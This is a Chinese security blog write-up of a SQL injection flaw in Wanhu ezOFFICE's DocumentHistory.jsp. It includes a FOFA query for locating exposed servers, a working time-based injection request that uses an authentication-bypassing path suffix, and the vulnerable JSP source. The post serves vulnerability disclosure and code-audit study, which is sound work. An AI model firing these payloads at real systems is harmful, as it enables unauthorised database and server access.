---
title: "万户OA DocumentHistory.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-DocumentHistory-sqli.html
asset_dir: assets/万户oa-documenthistory.jsp-sql注入漏洞
---

# 万户OA DocumentHistory.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/1/7 19:52
* 1437浏览
* [0评论](#comment)
* 13分钟阅读

深入探索

万户网络

鉴权

认证


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 0x01 产品简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice "ezoffice") 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。

SQL注入防护

# 0x02 漏洞概述

万户 ezOFFICE DocumentHistory.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")获取数据库权限，深入利用可获取服务器权限。

# 0x03 复现环境

本地环境 OR FOFA：app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

# 漏洞复现

```
GET /defaultroot/public/iSignatureHTML.jsp/DocumentHistory.jsp;.js?DocumentID=1'+WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Host: 192.168.22.187:7001
```

成功延时 5 秒  
[[![万户OA DocumentHistory.jsp SQL注入漏洞](images/img-001-8ada137faa0c.png)](https://mrxn.net/content/uploadfile/202501/c7291736258061.png)](https://mrxn.net/content/uploadfile/202501/c7291736258061.png)

# 漏洞分析

> 关于鉴权绕过，参考这篇文章：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)
>
> 代码安全审计

public/iSignatureHTML.jsp/DocumentHistory.jsp 代码如下，非常简单！

```
<%

  DocumentID=request.getParameter("DocumentID"); //取得编号

%>
......
<%
  if (ObjConnBean.OpenConnection()) {
    ResultSet rs = null;
    Statement stmt = null;

    System.out.println(DocumentID);
    System.out.println("开始");

 try {
      String strSql = "select * from HTMLHistory Where DocumentID='" + DocumentID + "'"+"order by SignatureID desc";
      rs = ObjConnBean.ExecuteQuery(strSql);
      System.out.println("错误");
       while (rs.next()){
%>
```

`DocumentID` 通过 `request.getParameter` 获取后直接拼接进 `SQL` 语句，然后执行，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，也是这么朴实无华！

漏洞扫描服务

# 最后

其他万户OA 相关漏洞  
[万户 ezOFFICE selectAmountField.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-selectAmountField-sqli.html)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#ezOFFICE](https://mrxn.net/tag/ezOFFICE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.0x01 产品简介](#toc-1-)
* [2.0x02 漏洞概述](#toc-2-)
* [3.0x03 复现环境](#toc-3-)
* [4.漏洞复现](#toc-4-)
* [5.漏洞分析](#toc-5-)
* [6.最后](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万户OA DocumentHistory.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-DocumentHistory-sqli.html)  
文章链接：<https://mrxn.net/jswz/defaultroot-ezOFFICE-DocumentHistory-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-DocumentHistory-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

营销

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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